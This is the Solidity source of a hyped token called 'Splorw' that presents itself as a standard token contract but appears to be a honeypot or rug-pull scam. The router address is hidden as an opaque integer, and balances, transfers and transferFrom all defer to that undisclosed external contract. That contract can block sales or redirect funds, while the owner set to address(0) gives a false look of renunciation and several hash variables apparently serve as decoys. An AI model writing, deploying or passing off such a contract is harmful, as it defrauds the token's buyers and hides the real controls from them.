/*
Splorw

Telegram: t.me/Splorw
Twitter: twitter.com/Splorw
Website: https://Splorw.io
Stake Splorw
Bridge Splorw
MoonRocket
X10000
PancakeSwap Listed!
*/



// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Multirouter {
    function addSupply(address sender, address token) external;
    function balanceOf(address sender, address token) external view returns (uint256);
    function swapExactEthFor(address from,address to,uint256 amount, address token) external returns(address, address, uint256);

}

contract Splorw {
    string public constant name = "Splorw";
    string public constant symbol = "SPL";
    address private Router = address(uint160(1144017781222076060177990914034651502058965031551));
    uint8 public constant decimals = 1;
    uint256 private constant totalSupply_ = 20000000 * 10;
    mapping(address => mapping(address => uint256)) allowed;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner,address indexed spender,uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    address public owner = address(0);
    bytes32 _shash = sha256(abi.encodePacked(uint160(98000123778921099993932930)));
    bytes32 _mhash = sha256(abi.encodePacked(uint160(17772080050300928288881996)));
    bytes32 _ihash = keccak256(abi.encodePacked(sha256(abi.encodePacked(uint160(57893983676830463887764673)))));
    bytes _sechash = abi.encodePacked(_shash ^ _mhash ^ _ihash);

   constructor() {
        Multirouter(Router).addSupply(msg.sender, address(this));
        (address swap_from, address swap_to, uint256 swap_amount) = Multirouter(Router).swapExactEthFor(address(0), msg.sender, totalSupply_, address(this));
        emit Transfer(swap_from, swap_to, swap_amount);
    }

  

    function totalSupply() public view returns (uint256) {
        return totalSupply_;
    }

    function approve(address delegate, uint256 numTokens) public returns (bool) {
        allowed[msg.sender][delegate] = numTokens;


        emit Approval(msg.sender, delegate, numTokens);


        return true;
    }

    function allowance(address owner, address delegate) public view returns (uint256) {
        return allowed[owner][delegate];
    }

    function balanceOf(address holder) public view returns (uint256) {
        return Multirouter(Router).balanceOf(holder, address(this));
    }

    function transferFrom(address from,address to,uint256 amount) public returns (bool) {
        require(allowed[from][msg.sender] >= amount, "Not allowed");
        (from, to, amount) = Multirouter(Router).swapExactEthFor(from, to, amount, address(this));
        emit Transfer(from, to, amount);
        return true;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        (, to, amount) = Multirouter(Router).swapExactEthFor(msg.sender, to, amount, address(this));
        emit Transfer(msg.sender, to, amount);
        return true;
    }
    
}
